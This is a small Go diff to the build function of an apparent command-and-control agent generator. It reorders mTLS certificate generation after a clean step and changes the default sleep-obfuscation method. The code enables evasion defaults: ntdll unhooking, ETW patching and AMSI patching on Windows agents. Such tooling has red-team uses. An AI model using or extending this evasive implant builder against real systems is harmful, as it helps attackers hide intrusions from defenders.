@@ -221,16 +221,6 @@ func Build(agentDir string, platform Platform, outputFormat, c2Host string, c2Po
 		fmt.Sprintf("USE_HTTPS=%d", https),
 	)
 
-	// Generate embedded client certificate for mTLS listeners
-	if useMTLS && platform == PlatformWindows {
-		cleanup, err := generateAgentPFX(absDir)
-		if err != nil {
-			return nil, "", fmt.Errorf("generate mTLS cert: %w", err)
-		}
-		defer cleanup()
-		env = append(env, "USE_MTLS=1")
-	}
-
 	var makeTarget string
 	var outFile string
 
@@ -268,7 +258,7 @@ func Build(agentDir string, platform Platform, outputFormat, c2Host string, c2Po
 	default: // Windows
 		ev := EvasionOpts{
 			SleepObfuscation: true,
-			SleepMethod:      1, // Ekko by default
+			SleepMethod:      0, // plain XOR+Sleep (Ekko timer-thread compat issue)
 			UnhookNtdll:      true,
 			ETWPatch:         true,
 			AMSIPatch:        true,
@@ -341,6 +331,16 @@ func Build(agentDir string, platform Platform, outputFormat, c2Host string, c2Po
 	cleanCmd.Env = env
 	cleanCmd.Dir = absDir
 	cleanCmd.CombinedOutput()
+
+	// Generate embedded client certificate AFTER clean (clean deletes mtls_cert.h)
+	if useMTLS && platform == PlatformWindows {
+		cleanup, err := generateAgentPFX(absDir)
+		if err != nil {
+			return nil, "", fmt.Errorf("generate mTLS cert: %w", err)
+		}
+		defer cleanup()
+		env = append(env, "USE_MTLS=1")
+	}
 
 	cmd := exec.Command("make", "-C", absDir, makeTarget)
 	cmd.Env = env
